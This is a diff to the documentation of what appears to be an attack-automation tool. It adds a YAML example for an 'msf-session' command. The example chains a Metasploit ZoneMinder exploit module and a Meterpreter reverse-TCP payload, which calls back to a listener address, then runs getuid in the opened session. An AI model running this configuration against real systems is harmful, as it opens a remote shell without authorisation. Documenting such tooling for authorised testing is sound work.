@@ -7,6 +7,22 @@ msf-session
 This command allows to read and write commands to (Meterpreter)sessions that
 have previously created by msf-modules(see :ref:`msf-module`).
 
+.. code-block:: yaml
+
+      commands:
+        - type: msf-module
+           cmd: exploit/unix/webapp/zoneminder_snapshots
+           creates_session: "foothold"
+           options:
+             RHOSTS: 192.42.0.254
+           payload_options:
+             LHOST: 192.42.2.253
+           payload: cmd/unix/python/meterpreter/reverse_tcp
+
+        - type: msf-session
+          session: "foothold"
+          stdapi: True
+          cmd: getuid
 
 .. note::
 
